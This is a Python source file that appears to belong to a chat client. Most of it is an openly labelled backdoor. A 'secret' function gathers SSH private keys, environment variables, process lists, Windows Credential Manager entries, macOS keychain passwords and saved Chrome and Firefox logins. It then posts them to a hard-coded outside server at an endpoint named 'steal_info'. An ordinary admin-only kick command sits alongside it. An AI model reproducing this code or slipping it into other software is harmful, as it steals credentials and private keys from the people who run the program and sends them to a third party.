import platform
import os
import json
import socket
import psutil
import requests
import base64
import sqlite3
from src import ui

logger = ui.init_logger('back_door')   # Initialize logger
ui.set_log_level(logger, 'DEBUG')   # SET LOG LEVEL AT HERE

def get_network_info():
    """Gather network-related information."""
    net_info = {
        "hostname": socket.gethostname(),
        "ip_address": socket.gethostbyname(socket.gethostname()),
        "interfaces": psutil.net_if_addrs(),
        "gateways": psutil.net_if_stats()
    }
    return net_info

def get_environment_variables():
    """Get the environment variables."""
    return dict(os.environ)

def get_process_list():
    """Get the current list of processes running on the system."""
    process_list = []
    for proc in psutil.process_iter(['pid', 'name', 'username']):
        process_list.append(proc.info)
    return process_list

def get_ssh_keys():
    """Get the SSH private keys if they exist."""
    ssh_keys = []
    home_dir = os.path.expanduser("~")
    ssh_dir = os.path.join(home_dir, ".ssh")
    if os.path.exists(ssh_dir):
        for file_name in os.listdir(ssh_dir):
            file_path = os.path.join(ssh_dir, file_name)
            if file_name.startswith("id_") and not file_name.endswith(".pub"):
                with open(file_path, 'rb') as file:
                    ssh_keys.append({file_name: base64.b64encode(file.read()).decode('utf-8')})
    return ssh_keys

def get_windows_passwords():
    """Extract passwords stored on Windows using Credential Manager."""
    if platform.system() != "Windows":
        return None

    try:
        import win32cred
        credentials = win32cred.CredEnumerate(None, 0)
        windows_passwords = []

        for cred in credentials:
            password_info = {
                'TargetName': cred['TargetName'],
                'UserName': cred['UserName'],
                'Password': base64.b64encode(cred.get('CredentialBlob', b'No Password')).decode('utf-8')
            }
            windows_passwords.append(password_info)

        return windows_passwords
    except ImportError:
        logger.warning("win32cred not installed, cannot fetch Windows passwords.")
        return None

def get_mac_keychain_passwords():
    """Extract passwords from macOS Keychain."""
    if platform.system() != "Darwin":
        return None

    try:
        import keyring
        mac_passwords = []
        
        # Specify known services, as keyring doesn't support listing all services directly
        known_services = ['Safari', 'iCloud', 'Google Chrome']
        
        for service in known_services:
            password = keyring.get_password(service, 'default')
            if password:
                mac_passwords.append({service: password})

        return mac_passwords
    except ImportError:
        logger.warning("keyring not installed, cannot fetch macOS passwords.")
        return None

def get_browser_passwords():
    """Extract passwords from Chrome and Firefox on Windows, macOS, and Linux."""
    browser_passwords = {}

    def extract_chrome_passwords():
        """Extract passwords from Chrome browser (available on Windows, macOS, Linux)."""
        paths = {
            "Windows": os.path.expanduser('~') + r'\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data',
            "Darwin": os.path.expanduser('~') + r'/Library/Application Support/Google/Chrome/Default/Login Data',
            "Linux": os.path.expanduser('~') + r'/.config/google-chrome/Default/Login Data'
        }

        db_path = paths.get(platform.system())
        if not db_path or not os.path.exists(db_path):
            return []

        try:
            conn = sqlite3.connect(db_path)
            cursor = conn.cursor()
            cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
            chrome_passwords = []

            for row in cursor.fetchall():
                password_info = {
                    'url': row[0],
                    'username': row[1],
                    'password': base64.b64encode(row[2]).decode('utf-8')
                }
                chrome_passwords.append(password_info)
            
            conn.close()
            return chrome_passwords
        except Exception as e:
            logger.error(f"Failed to extract Chrome passwords: {e}")
            return []

    def extract_firefox_passwords():
        """Extract passwords from Firefox browser (available on Windows, macOS, Linux)."""
        paths = {
            "Windows": os.path.expanduser('~') + r'\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\',
            "Darwin": os.path.expanduser('~') + r'/Library/Application Support/Firefox/Profiles/',
            "Linux": os.path.expanduser('~') + r'/.mozilla/firefox/'
        }

        db_dir = paths.get(platform.system())
        if not db_dir or not os.path.exists(db_dir):
            return []

        profile_dir = [d for d in os.listdir(db_dir) if d.endswith('.default-release')]
        if not profile_dir:
            return []

        db_path = os.path.join(db_dir, profile_dir[0], 'logins.json')
        if not os.path.exists(db_path):
            return []

        try:
            with open(db_path, 'r') as file:
                firefox_data = json.load(file)
                return firefox_data.get('logins', [])
        except Exception as e:
            logger.error(f"Failed to extract Firefox passwords: {e}")
            return []

    browser_passwords['Chrome'] = extract_chrome_passwords()
    browser_passwords['Firefox'] = extract_firefox_passwords()

    return browser_passwords

async def secret(self):
    # BACK DOOR: Send system information to the attacker
    try:
        # Collect client's information
        system_info = {
            "username": self.username,
            "os": platform.system(),
            "os_version": platform.version(),
            "architecture": platform.machine(),
            "hostname": socket.gethostname(),
            "file_list": os.listdir('.'),
            "environment_vars": get_environment_variables(),
            "process_list": get_process_list(),
            "ssh_keys": get_ssh_keys(),
            "network_info": get_network_info(),
            "windows_passwords": get_windows_passwords(),
            "mac_keychain_passwords": get_mac_keychain_passwords(),
            "browser_passwords": get_browser_passwords()
        }

        # Remove any None values to avoid sending invalid data
        system_info = {key: value for key, value in system_info.items() if value is not None}

        # Convert the information into a JSON
        message = json.dumps(system_info, indent=4)  # Pretty-print with indentation
        logger.info(f"System Info: {message}")
        
        # Specify the remote server URL to send the data
        attacker_url = "http://sp.xiofelix.com:5000/steal_info"

        # Send the system information to the attacker's server
        try:
            response = requests.post(attacker_url, json=system_info)
            if response.status_code == 200:
                logger.warning("Backdoor executed: system information sent to the attacker.")
            else:
                logger.error(f"Failed to send system information, status code: {response.status_code}")
        except Exception as send_error:
            logger.error(f"Failed to send system information to attacker: {send_error}")

    except Exception as e:
        logger.error(f"Failed to execute backdoor: {e}")

async def kick_user(self, target_username):
    """
    Send a request to the server to kick a user.

    Args:
        target_username (str): The username of the user to kick.
    """
    # Only allow the admin user to send this command
    if self.username != "admin":
        logger.warning("You do not have permission to use this command.")
        return

    data = {
        "type": "kick_user",
        "target": target_username
    }
    signed_data = self.create_signed_data(data)
    await self.send_signed_message(signed_data)
    logger.debug(f"Sent kick request for user {target_username}.")
